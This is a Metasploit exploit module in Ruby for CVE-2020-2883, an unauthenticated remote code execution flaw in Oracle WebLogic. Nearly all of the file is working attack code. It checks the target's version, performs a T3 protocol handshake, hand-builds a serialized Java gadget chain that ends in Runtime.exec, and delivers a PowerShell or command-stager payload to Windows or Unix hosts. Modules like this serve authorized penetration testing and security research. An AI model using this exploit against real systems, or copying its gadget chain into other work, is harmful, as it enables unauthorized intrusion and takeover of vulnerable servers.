# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;WebLogic Server Deserialization RCE BadAttributeValueExpException ExtComp&#039;,
        &#039;Description&#039; => %q{
          There exists a Java object deserialization vulnerability
          in multiple versions of WebLogic.

          Unauthenticated remote code execution can be achieved by
          sending a serialized `BadAttributeValueExpException`
          object over the T3 protocol to vulnerable versions of
          WebLogic. Leveraging an `ExtractorComparator` enables
          the ability to trigger `method.invoke()`, which will
          execute arbitrary code.
        },
        &#039;License&#039; => MSF_LICENSE,
        &#039;Author&#039; =>
        [
          &#039;Quynh Le&#039;, # Vulnerability Discovery
          &#039;Y4er&#039;, # PoC
          &#039;Shelby Pace&#039; # Metasploit Module
        ],
        &#039;References&#039; =>
          [
            [ &#039;CVE&#039;, &#039;2020-2883&#039; ],
            [ &#039;URL&#039;, &#039;https://www.thezdi.com/blog/2020/5/8/details-on-the-oracle-weblogic-vulnerability-being-exploited-in-the-wild&#039; ],
          ],
        &#039;Platform&#039; => %w[unix linux win],
        &#039;Arch&#039; => [ ARCH_X86, ARCH_X64 ],
        &#039;Privileged&#039; => false,
        &#039;Targets&#039; =>
          [
            [
              &#039;Windows&#039;,
              {
                &#039;Platform&#039; => &#039;win&#039;,
                &#039;Arch&#039; => [ ARCH_X86, ARCH_X64 ],
              }
            ],
            [
              &#039;Unix&#039;,
              {
                &#039;Platform&#039; => %w[unix linux],
                &#039;CmdStagerFlavor&#039; => &#039;printf&#039;,
                &#039;Arch&#039; => [ ARCH_X86, ARCH_X64 ],
              }
            ],
          ],
        &#039;DisclosureDate&#039; => &#039;2020-04-30&#039;,
        &#039;DefaultTarget&#039; => 0
      )
    )

    register_options([ Opt::RPORT(7001) ])
  end

  def check
    connect

    web_req = "GET /console/login/LoginForm.jsp HTTP/1.1\nHost: #{peer}\n\n"
    sock.put(web_req)
    sleep(2)
    res = sock.get_once

    versions =
      [
        Gem::Version.new(&#039;12.1.3.0.0&#039;), Gem::Version.new(&#039;12.2.1.3.0&#039;),
        Gem::Version.new(&#039;12.2.1.4.0&#039;)
      ]

    return CheckCode::Unknown(&#039;Failed to obtain response from service&#039;) unless res

    /WebLogic\s+Server\s+Version:\s+(?<version>\d+\.\d+\.\d+\.*\d*\.*\d*)/ =~ res
    return CheckCode::Unknown(&#039;Failed to detect WebLogic&#039;) unless version

    @version_no = Gem::Version.new(version)
    print_status("WebLogic version detected: #{@version_no}")

    return CheckCode::Appears if versions.include?(@version_no)

    CheckCode::Detected(&#039;Version of WebLogic is not vulnerable&#039;)
  ensure
    disconnect
  end

  def exploit
    super

    connect
    print_status(&#039;Sending handshake...&#039;)
    t3_handshake

    if target.name == &#039;Windows&#039;
      win_obj = cmd_psh_payload(payload.encoded, payload_instance.arch.first, { remove_comspec: true })
      win_obj = build_payload_obj(win_obj)
      t3_send(win_obj)
    else
      execute_cmdstager
    end
  ensure
    disconnect
  end

  def t3_handshake
    # t3 12.2.1\nAS:255
    # \nHL:19\nMS:100000
    # 00\n\n
    shake = &#039;74332031322e322e310a41533a323535&#039;
    shake << &#039;0a484c3a31390a4d533a313030303030&#039;
    shake << &#039;30300a0a&#039;

    sock.put([shake].pack(&#039;H*&#039;))
    sleep(1)
    sock.get_once
  end

  def build_payload_obj(payload_data)
    payload_obj = &#039;aced0005&#039; # STREAM_MAGIC, STREAM_VERSION
    payload_obj << &#039;73720017&#039; # TC_OBJECT, TC_CLASSDESC, class name length: 23
    payload_obj << &#039;6a6176612e7574696c2e5072696f726974795175657565&#039; # java.util.PriorityQueue
    payload_obj << &#039;94da30b4fb3f82b1&#039; # SerialVersionUID
    payload_obj << &#039;030002&#039; # 2 fields
    payload_obj << &#039;490004&#039; # Integer, field name length: 4
    payload_obj << &#039;73697a65&#039; # size
    payload_obj << &#039;4c000a&#039; # Object, field name length: 10
    payload_obj << &#039;636f6d70617261746f72&#039; # comparator
    payload_obj << &#039;740016&#039; # String, field name length: 22
    payload_obj << &#039;4c6a6176612f7574696c2f436f6d70617261746f723b&#039; # Ljava/util/Comparator;
    payload_obj << &#039;7870&#039;
    payload_obj << &#039;00000002&#039;
    payload_obj << &#039;7372&#039; # TC_OBJECT, TC_CLASSDESC
    payload_obj << &#039;0030&#039; # Class name length: 48
    payload_obj << &#039;636f6d2e74616e676f736f6c2e7574696c2e636f&#039; # com.tangosol.util.comparator.ExtractorComparator
    payload_obj << &#039;6d70617261746f722e457874726163746f72436f&#039;
    payload_obj << &#039;6d70617261746f72&#039;
    payload_obj << extractor_comp_uid # SerialVersionUID
    payload_obj << &#039;020001&#039; # Serializable, 1 field
    payload_obj << &#039;4c000b&#039; # Object, field name length: 11
    payload_obj << &#039;6d5f657874726163746f72&#039; # m_extractor
    payload_obj << &#039;740022&#039;
    payload_obj << &#039;4c636f6d2f74616e676f736f6c2f7574696c2f56&#039; # Lcom/tangosol/util/ValueExtractor;
    payload_obj << &#039;616c7565457874726163746f723b&#039;
    payload_obj << &#039;7870&#039;
    payload_obj << &#039;7372&#039; # TC_OBJECT, TC_CLASSDESC
    payload_obj << &#039;002c&#039; # Class name length: 44
    payload_obj << &#039;636f6d2e74616e676f736f6c2e7574696c2e6578&#039; # com.tangosol.util.extractor.ChainedExtractor
    payload_obj << &#039;74726163746f722e436861696e65644578747261&#039;
    payload_obj << &#039;63746f72&#039;
    payload_obj << chained_extractor_uid # SerialVersionUID
    payload_obj << &#039;020000&#039;
    payload_obj << &#039;7872&#039; # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << &#039;0036&#039; # Class name length: 54
    payload_obj << &#039;636f6d2e74616e676f736f6c2e7574696c2e6578&#039; # com.tangosol.util.extractor.AbstractCompositeExtractor
    payload_obj << &#039;74726163746f722e4162737472616374436f6d70&#039;
    payload_obj << &#039;6f73697465457874726163746f72&#039;
    payload_obj << &#039;086b3d8c05690f44&#039; # SerialVersionUID
    payload_obj << &#039;020001&#039; # Serializable, 1 field
    payload_obj << &#039;5b000c&#039; # array, length: 12
    payload_obj << &#039;6d5f61457874726163746f72&#039; # m_aExtractor
    payload_obj << &#039;740023&#039; # String, length: 35
    payload_obj << &#039;5b4c636f6d2f74616e676f736f6c2f7574696c2f&#039; # [Lcom/tangosol/util/ValueExtractor;
    payload_obj << &#039;56616c7565457874726163746f723b&#039;
    payload_obj << &#039;7872&#039; # TC_ENDBLOCKDATA, TC_CLASSDESC
    payload_obj << &#039;002d&#039; # Class name length: 45
    payload_obj << &#039;636f6d2e74616e676f736f6c2e7574696c2e6578&#039; # com.tangosol.util.extractor.AbstractExtractor
    payload_obj << &#039;74726163746f722e416273747261637445787472&#039;
    payload_obj << &#039;6163746f72&#039;
    payload_obj << abstract_extractor_uid # SerialVersionUID
    payload_obj << &#039;020001&#039; # Serializable, 1 field
    payload_obj << &#039;490009&#039; # Integer, field name length: 9
    payload_obj << &#039;6d5f6e546172676574&#039; # m_nTarget
    payload_obj << &#039;7870&#039;
    payload_obj << &#039;00000000&#039;
    payload_obj << &#039;7572&#039; # TC_ARRAY, TC_CLASSDESC
    payload_obj << &#039;0023&#039; # Class name length: 35
    payload_obj << &#039;5b4c636f6d2e74616e676f736f6c2e7574696c2e&#039; # [Lcom.tangosol.util.ValueExtractor;
    payload_obj << &#039;56616c7565457874726163746f723b&#039;
    payload_obj << &#039;2246204735c4a0fe&#039; # SerialVersionUID
    payload_obj << &#039;020000&#039;
    payload_obj << &#039;7870&#039;
    payload_obj << &#039;00000003&#039;
    payload_obj << &#039;7372&#039;
    payload_obj << &#039;002f&#039; # Class name length: 47
    payload_obj << &#039;636f6d2e74616e676f736f6c2e7574696c2e6578&#039; # com.tangosol.util.extractor.ReflectionExtractor
    payload_obj << &#039;74726163746f722e5265666c656374696f6e4578&#039;
    payload_obj << &#039;74726163746f72&#039;
    payload_obj << reflection_extractor_uid # SerialVersionUID
    payload_obj << &#039;02000&#039; # Serializable
    payload_obj << reflect_extract_count
    payload_obj << &#039;5b0009&#039; # array, length: 9
    payload_obj << &#039;6d5f616f506172616d&#039; # m_aoParam
    payload_obj << &#039;740013&#039; # String, length: 19
    payload_obj << &#039;5b4c6a6176612f6c616e672f4f626a6563743b&#039; # [Ljava/lang/Object;
    payload_obj << add_sect
    payload_obj << &#039;4c0009&#039; # Object, length: 9
    payload_obj << &#039;6d5f734d6574686f64&#039; # m_sMethod
    payload_obj << &#039;740012&#039; # String, length: 18
    payload_obj << &#039;4c6a6176612f6c616e672f537472696e673b&#039; # Ljava/lang/String;
    payload_obj << &#039;7871&#039; # TC_ENDBLOCKDATA, TC_REFERENCE
    payload_obj << &#039;007e0009&#039; # handle
    payload_obj << &#039;00000000&#039;
    payload_obj << &#039;7572&#039;
    payload_obj << &#039;0013&#039; # Class name length: 19
    payload_obj << &#039;5b4c6a6176612e6c616e672e4f626a6563743b&#039; # [Ljava.lang.Object;
    payload_obj << &#039;90ce589f1073296c&#039; # SerialVersionUID
    payload_obj << &#039;020000&#039;
    payload_obj << &#039;7870&#039;
    payload_obj << &#039;00000002&#039;
    payload_obj << &#039;74000a&#039; # String, length: 10
    payload_obj << &#039;67657452756e74696d65&#039; # getRuntime
    payload_obj << &#039;7572&#039; # TC_ARRAY, TC_CLASSDESC
    payload_obj << &#039;0012&#039; # Class name length: 18
    payload_obj << &#039;5b4c6a6176612e6c616e672e436c6173733b&#039; # [Ljava.lang.Class;
    payload_obj << &#039;ab16d7aecbcd5a99&#039; # SerialVersionUID
    payload_obj << &#039;020000&#039; # Serializable, no fields
    payload_obj << &#039;7870&#039;
    payload_obj << &#039;00000000&#039;
    payload_obj << add_tc_null
    payload_obj << &#039;740009&#039; # String, length: 9
    payload_obj << &#039;6765744d6574686f64&#039; # getMethod
    payload_obj << &#039;7371&#039;
    payload_obj << &#039;007e000d&#039; # handle
    payload_obj << &#039;00000000&#039;
    payload_obj << &#039;7571&#039;
    payload_obj << (change_handle? ? &#039;007e0012&#039; : &#039;007e0011&#039;) # handle
    payload_obj << &#039;00000002&#039;
    payload_obj << &#039;707571&#039;
    payload_obj << (change_handle? ? &#039;007e0012&#039; : &#039;007e0011&#039;) # handle
    payload_obj << &#039;00000000&#039;
    payload_obj << add_tc_null
    payload_obj << &#039;740006&#039; # String, length: 6
    payload_obj << &#039;696e766f6b65&#039; # invoke
    payload_obj << &#039;7371&#039;
    payload_obj << &#039;007e000d&#039; # handle
    payload_obj << &#039;00000000&#039;
    payload_obj << &#039;7571&#039;
    payload_obj << (change_handle? ? &#039;007e0012&#039; : &#039;007e0011&#039;) # handle
    payload_obj << &#039;00000001&#039;
    payload_obj << &#039;7572&#039; # TC_ARRAY, TC_CLASSDESC
    payload_obj << &#039;0013&#039; # Class name length: 19
    payload_obj << &#039;5b4c6a6176612e6c616e672e537472696e673b&#039; # [Ljava.lang.String;
    payload_obj << &#039;add256e7e91d7b47&#039; # SerialVersionUID
    payload_obj << &#039;020000&#039;
    payload_obj << &#039;7870&#039;
    payload_obj << &#039;00000003&#039;

    payload_bin = format_payload(payload_data)
    payload_obj << payload_bin

    payload_obj << add_tc_null
    payload_obj << &#039;740004&#039;
    payload_obj << &#039;65786563&#039; # exec
    payload_obj << &#039;7704&#039;
    payload_obj << &#039;00000003&#039;
    payload_obj << &#039;76720011&#039;
    payload_obj << &#039;6a6176612e6c616e672e52756e74696d65&#039; # java.lang.Runtime
    payload_obj << &#039;0000000000000000000000&#039;
    payload_obj << &#039;7870&#039;
    payload_obj << &#039;740001&#039;
    payload_obj << &#039;3178&#039;
  end

  def extractor_comp_uid
    case @version_no
    when Gem::Version.new(&#039;12.1.3.0.0&#039;)
      &#039;c7ad6d3a676f3c18&#039;
    when Gem::Version.new(&#039;12.2.1.3.0&#039;)
      &#039;fb4ac83df1d72edc&#039;
    else
      &#039;f9b3bc58cc52cd21&#039;
    end
  end

  def change_handle?
    @version_no == Gem::Version.new(&#039;12.2.1.3.0&#039;)
  end

  def chained_extractor_uid
    case @version_no
    when Gem::Version.new(&#039;12.1.3.0.0&#039;)
      &#039;889f81b0945d5b7f&#039;
    when Gem::Version.new(&#039;12.2.1.3.0&#039;)
      &#039;06ee10433a4cc4b4&#039;
    else
      &#039;435b250b72f63db5&#039;
    end
  end

  def abstract_extractor_uid
    case @version_no
    when Gem::Version.new(&#039;12.1.3.0.0&#039;)
      &#039;658195303e723821&#039;
    when Gem::Version.new(&#039;12.2.1.3.0&#039;)
      &#039;752289ad4d460138&#039;
    else
      &#039;9b1be18ed70100e5&#039;
    end
  end

  def reflection_extractor_uid
    case @version_no
    when Gem::Version.new(&#039;12.1.3.0.0&#039;)
      &#039;ee7ae995c02fb4a2&#039;
    when Gem::Version.new(&#039;12.2.1.3.0&#039;)
      &#039;87973791b26429dd&#039;
    else
      &#039;1f62f564b951b614&#039;
    end
  end

  def reflect_extract_count
    case @version_no
    when Gem::Version.new(&#039;12.2.1.3.0&#039;)
      &#039;3&#039;
    else
      &#039;2&#039;
    end
  end

  def add_sect
    sect = &#039;&#039;

    if @version_no == Gem::Version.new(&#039;12.2.1.3.0&#039;)
      sect << &#039;4c0011&#039; # Object, length: 17
      sect << &#039;6d5f657874726163746f&#039; # m_extractorCached
      sect << &#039;72436163686564&#039;
      sect << &#039;740012&#039;
      sect << &#039;4c6a6176612f6c616e67&#039; # Ljava/lang/Object;
      sect << &#039;2f4f626a6563743b&#039;
    end

    sect
  end

  def add_tc_null
    return &#039;70&#039; if @version_no == Gem::Version.new(&#039;12.2.1.3.0&#039;)

    &#039;&#039;
  end

  def t3_send(payload_obj)
    print_status(&#039;Sending object...&#039;)

    request_obj = &#039;000009f3&#039; # Original packet length
    request_obj << &#039;016501&#039; # CMD_IDENTIFY_REQUEST, flags
    request_obj << &#039;ffffffffffffffff&#039;
    request_obj << &#039;00000071&#039;
    request_obj << &#039;0000ea60&#039;
    request_obj << &#039;00000018432ec6&#039;
    request_obj << &#039;a2a63985b5af7d63e643&#039;
    request_obj << &#039;83f42a6d92c9e9af0f94&#039;
    request_obj << &#039;72027973720078720178&#039;
    request_obj << &#039;720278700000000c0000&#039;
    request_obj << &#039;00020000000000000000&#039;
    request_obj << &#039;00000001007070707070&#039;
    request_obj << &#039;700000000c0000000200&#039;
    request_obj << &#039;00000000000000000000&#039;
    request_obj << &#039;01007006&#039;
    request_obj << &#039;fe010000&#039; # separator
    request_obj << &#039;aced0005&#039; # STREAM_MAGIC, STREAM_VERSION
    request_obj << &#039;7372&#039; # TC_OBJECT, TC_CLASSDESC
    request_obj << &#039;001d&#039; # Class name length: 29
    request_obj << &#039;7765626c6f6769632e72&#039; # weblogic.rjvm.ClassTableEntry
    request_obj << &#039;6a766d2e436c61737354&#039;
    request_obj << &#039;61626c65456e747279&#039;
    request_obj << &#039;2f52658157f4f9ed&#039; # SerialVersionUID
    request_obj << &#039;0c0000&#039; # flags?
    request_obj << &#039;787072&#039; # TC_ENDBLOCKDATA, TC_NULL, TC_CLASSDESC
    request_obj << &#039;0024&#039; # Class name length: 36
    request_obj << &#039;7765626c6f6769632e63&#039; # weblogic.common.internal.PackageInfo
    request_obj << &#039;6f6d6d6f6e2e696e7465&#039;
    request_obj << &#039;726e616c2e5061636b61&#039;
    request_obj << &#039;6765496e666f&#039;
    request_obj << &#039;e6f723e7b8ae1ec9&#039; # SerialVersionUID
    request_obj << &#039;020009&#039; # Serializable, 9 fields
    request_obj << &#039;490005&#039; # Field type: Int, field name length: 5
    request_obj << &#039;6d616a6f72&#039; # major
    request_obj << &#039;490005&#039; # Field type: Int, field name length: 5
    request_obj << &#039;6d696e6f72&#039; # minor
    request_obj << &#039;49000b&#039; # Field type: Int, field name length: 11
    request_obj << &#039;70617463685570646174&#039; # patchUpdate
    request_obj << &#039;65&#039;
    request_obj << &#039;49000c&#039; # Field type: Int, field name length: 12
    request_obj << &#039;726f6c6c696e67506174&#039; # rollingPatch
    request_obj << &#039;6368&#039;
    request_obj << &#039;49000b&#039; # Field type: Int, field name length: 11
    request_obj << &#039;73657276696365506163&#039; # servicePack
    request_obj << &#039;6b&#039;
    request_obj << &#039;5a000e&#039; # Field type: Z = Bool, field name length: 14
    request_obj << &#039;74656d706f7261727950&#039; # temporaryPatch
    request_obj << &#039;61746368&#039;
    request_obj << &#039;4c0009&#039; # Field type: Object, field name length: 9
    request_obj << &#039;696d706c5469746c65&#039; # implTitle
    request_obj << &#039;740012&#039; # String, length: 18
    request_obj << &#039;4c6a6176612f6c616e67&#039; # Ljava/lang/String;
    request_obj << &#039;2f537472696e673b&#039;
    request_obj << &#039;4c000a&#039; # Field type: Object, field name length: 10
    request_obj << &#039;696d706c56656e646f72&#039; # implVendor
    request_obj << &#039;71007e0003&#039; # TC_REFERENCE, handle
    request_obj << &#039;4c000b&#039; # Field type: Object, field name length: 11
    request_obj << &#039;696d706c56657273696f6e&#039; # implVersion
    request_obj << &#039;71007e0003&#039; # TC_REFERENCE, handle
    request_obj << &#039;7870&#039; # TC_ENDBLOCKDATA, TC_NULL
    request_obj << &#039;7702&#039; # TC_ENDBLOCKDATA
    request_obj << &#039;000078&#039;
    request_obj << &#039;fe010000&#039; # separator

    request_obj << payload_obj

    request_obj << &#039;fe010000&#039; # separator
    request_obj << &#039;aced0005&#039; # STREAM_MAGIC, STREAM_VERSION
    request_obj << &#039;7372&#039; # TC_OBJECT, TC_CLASSDESC
    request_obj << &#039;001d&#039; # Class name length: 29
    request_obj << &#039;7765626c6f6769632e72&#039; # weblogic.rjvm.ClassTableEntry
    request_obj << &#039;6a766d2e436c61737354&#039;
    request_obj << &#039;61626c65456e747279&#039;
    request_obj << &#039;2f52658157f4f9ed&#039; # SerialVersionUID
    request_obj << &#039;0c0000&#039;
    request_obj << &#039;787072&#039; # TC_ENDBLOCKDATA, TC_NULL, TC_CLASSDESC
    request_obj << &#039;0021&#039; # Class name length: 33
    request_obj << &#039;7765626c6f6769632e63&#039; # weblogic.common.internal.PeerInfo
    request_obj << &#039;6f6d6d6f6e2e696e7465&#039;
    request_obj << &#039;726e616c2e5065657249&#039;
    request_obj << &#039;6e666f&#039;
    request_obj << &#039;585474f39bc908f1&#039; # SerialVersionUID
    request_obj << &#039;020007&#039; # Serializable, 7 fields
    request_obj << &#039;490005&#039; # Field type: Int, field name length: 5
    request_obj << &#039;6d616a6f72&#039; # major
    request_obj << &#039;490005&#039; # Field type: Int, field name length: 5
    request_obj << &#039;6d696e6f72&#039; # minor
    request_obj << &#039;49000b&#039; # Field type: Int, field name length: 11
    request_obj << &#039;70617463685570646174&#039; # patchUpdate
    request_obj << &#039;65&#039;
    request_obj << &#039;49000c&#039; # Field type: Int, field name length: 12
    request_obj << &#039;726f6c6c696e67506174&#039; # rollingPatch
    request_obj << &#039;6368&#039;
    request_obj << &#039;49000b&#039; # Field type: Int, field name length: 11
    request_obj << &#039;73657276696365506163&#039; # servicePack
    request_obj << &#039;6b&#039;
    request_obj << &#039;5a000e&#039; # Field type: Z = Bool, field name length: 14
    request_obj << &#039;74656d706f7261727950&#039; # temporaryPatch
    request_obj << &#039;61746368&#039;
    request_obj << &#039;5b0008&#039; # Field type: Array, field name length: 8
    request_obj << &#039;7061636b61676573&#039; # packages
    request_obj << &#039;740027&#039; # String, length: 39
    request_obj << &#039;5b4c7765626c6f676963&#039; # [Lweblogic/common/internal/PackageInfo;
    request_obj << &#039;2f636f6d6d6f6e2f696e&#039;
    request_obj << &#039;7465726e616c2f506163&#039;
    request_obj << &#039;6b616765496e666f3b&#039;
    request_obj << &#039;7872&#039; # TC_ENDBLOCKDATA, TC_CLASSDESC
    request_obj << &#039;0024&#039; # Class name length: 36
    request_obj << &#039;7765626c6f6769632e63&#039; # weblogic.common.internal.VersionInfo
    request_obj << &#039;6f6d6d6f6e2e696e7465&#039;
    request_obj << &#039;726e616c2e5665727369&#039;
    request_obj << &#039;6f6e496e666f&#039;
    request_obj << &#039;972245516452463e&#039; # SerialVersionUID
    request_obj << &#039;020003&#039; # Serializable, 3 fields
    request_obj << &#039;5b0008&#039; # Field type: Array, field name length: 8
    request_obj << &#039;7061636b61676573&#039; # packages
    request_obj << &#039;71007e0003&#039; # TC_REFERENCE, handle
    request_obj << &#039;4c000e&#039; # Field type: Object, field name length: 14
    request_obj << &#039;72656c65617365566572&#039; # releaseVersion
    request_obj << &#039;73696f6e&#039;
    request_obj << &#039;740012&#039; # String, length: 18
    request_obj << &#039;4c6a6176612f6c616e67&#039; # Ljava/lang/String;
    request_obj << &#039;2f537472696e673b&#039;
    request_obj << &#039;5b0012&#039; # Field type: Array, field name length: 18
    request_obj << &#039;76657273696f6e496e66&#039; # versionInfoAsBytes
    request_obj << &#039;6f41734279746573&#039;
    request_obj << &#039;740002&#039; # String, length: 2
    request_obj << &#039;5b42&#039; # [B
    request_obj << &#039;7872&#039; # TC_ENDBLOCKDATA, TC_CLASSDESC
    request_obj << &#039;0024&#039; # Class name length: 36
    request_obj << &#039;7765626c6f6769632e63&#039; # weblogic.common.internal.PackageInfo
    request_obj << &#039;6f6d6d6f6e2e696e7465&#039;
    request_obj << &#039;726e616c2e5061636b61&#039;
    request_obj << &#039;6765496e666f&#039;
    request_obj << &#039;e6f723e7b8ae1ec9&#039; # SerialVersionUID
    request_obj << &#039;020009&#039; # Serializable, 9 fields
    request_obj << &#039;490005&#039; # Field type: Int, field name length: 5
    request_obj << &#039;6d616a6f72&#039; # major
    request_obj << &#039;490005&#039; # Field type: Int, field name length: 5
    request_obj << &#039;6d696e6f72&#039; # minor
    request_obj << &#039;49000b&#039; # Field type: Int, field name length: 11
    request_obj << &#039;70617463685570646174&#039; # patchUpdate
    request_obj << &#039;65&#039;
    request_obj << &#039;49000c&#039; # Field type: Int, field name length: 12
    request_obj << &#039;726f6c6c696e67506174&#039; # rollingPatch
    request_obj << &#039;6368&#039;
    request_obj << &#039;49000b&#039; # Field type: Int, field name length: 11
    request_obj << &#039;73657276696365506163&#039; # servicePack
    request_obj << &#039;6b&#039;
    request_obj << &#039;5a000e&#039; # Field type: Z = Bool, field name length: 14
    request_obj << &#039;74656d706f7261727950&#039; # temporaryPatch
    request_obj << &#039;61746368&#039;
    request_obj << &#039;4c0009&#039; # Field type: Object, field name length: 9
    request_obj << &#039;696d706c5469746c65&#039; # implTitle
    request_obj << &#039;71007e0005&#039; # TC_REFERENCE, handle
    request_obj << &#039;4c000a&#039; # Field type: Object, field name length: 10
    request_obj << &#039;696d706c56656e646f72&#039; # implVendor
    request_obj << &#039;71007e0005&#039; # TC_REFERENCE, handle
    request_obj << &#039;4c000b&#039; # Field type: Object, field name length: 11
    request_obj << &#039;696d706c56657273696f&#039; # implVersion
    request_obj << &#039;6e&#039;
    request_obj << &#039;71007e0005&#039; # TC_REFERENCE, handle
    request_obj << &#039;7870&#039; # TC_ENDBLOCKDATA, TC_NULL
    request_obj << &#039;7702000078&#039; # TC_BLOCKDATA, 2 bytes, TC_ENDBLOCKDATA
    request_obj << &#039;fe00ff&#039; # separator
    request_obj << &#039;fe010000&#039;
    request_obj << &#039;aced0005&#039; # STREAM_MAGIC, STREAM_VERSION
    request_obj << &#039;7372&#039; # TC_OBJECT, TC_CLASSDESC
    request_obj << &#039;0013&#039; # Class name length: 19
    request_obj << &#039;7765626c6f6769632e72&#039; # weblogic.rjvm.JVMID
    request_obj << &#039;6a766d2e4a564d4944&#039;
    request_obj << &#039;dc49c23ede121e2a&#039; # SerialVersionUID
    request_obj << &#039;0c0000&#039;
    request_obj << &#039;787077&#039; # TC_ENDBLOCKDATA, TC_NULL, TC_BLOCKDATA
    request_obj << &#039;4621&#039;
    request_obj << &#039;000000000000000000&#039;
    request_obj << &#039;09&#039; # length: 9
    request_obj << &#039;3132372e302e312e31&#039; # 127.0.1.1
    request_obj << &#039;000b&#039; # length: 11
    request_obj << &#039;75732d6c2d627265656e&#039; # us-l-breens
    request_obj << &#039;73&#039;
    request_obj << &#039;a53caff10000000700&#039;
    request_obj << &#039;001b59&#039;
    request_obj << &#039;ffffffffffffffffffff&#039;
    request_obj << &#039;ffffffffffffffffffff&#039;
    request_obj << &#039;ffffffff&#039;
    request_obj << &#039;0078&#039;
    request_obj << &#039;fe010000&#039; # separator
    request_obj << &#039;aced0005&#039; # STREAM_MAGIC, STREAM_VERSION
    request_obj << &#039;7372&#039; # TC_OBJECT, TC_CLASSDESC
    request_obj << &#039;0013&#039; # Class name length: 19
    request_obj << &#039;7765626c6f6769632e72&#039; # weblogic.rjvm.JVMID
    request_obj << &#039;6a766d2e4a564d4944&#039;
    request_obj << &#039;dc49c23ede121e2a&#039; # SerialVersionUID
    request_obj << &#039;0c0000&#039;
    request_obj << &#039;787077&#039; # TC_ENDBLOCKDATA, TC_NULL, TC_BLOCKDATA
    request_obj << &#039;1d0181401281&#039;
    request_obj << &#039;34bf427600093132372e&#039;
    request_obj << &#039;302e312e31a53caff1&#039;
    request_obj << &#039;000000000078&#039;

    new_len = (request_obj.length / 2).to_s(16).rjust(8, &#039;0&#039;)
    request_obj[0, 8] = new_len

    sock.put([request_obj].pack(&#039;H*&#039;))
    sleep(1)
  end

  def format_payload(payload_cmd)
    print_status(&#039;Formatting payload...&#039;)
    payload_arr = payload_cmd.split(&#039; &#039;, 3)

    formatted_payload = &#039;&#039;
    payload_arr.each do |part|
      formatted_payload << &#039;74&#039; # denotes a string
      formatted_payload << part.length.to_s(16).rjust(4, &#039;0&#039;)
      formatted_payload << part.each_byte.map { |b| b.to_s(16).rjust(2, &#039;0&#039;) }.join
    end

    formatted_payload
  end

  def execute_command(cmd, _opts = {})
    cmd = build_payload_obj(cmd)

    t3_send(cmd)
  end
end

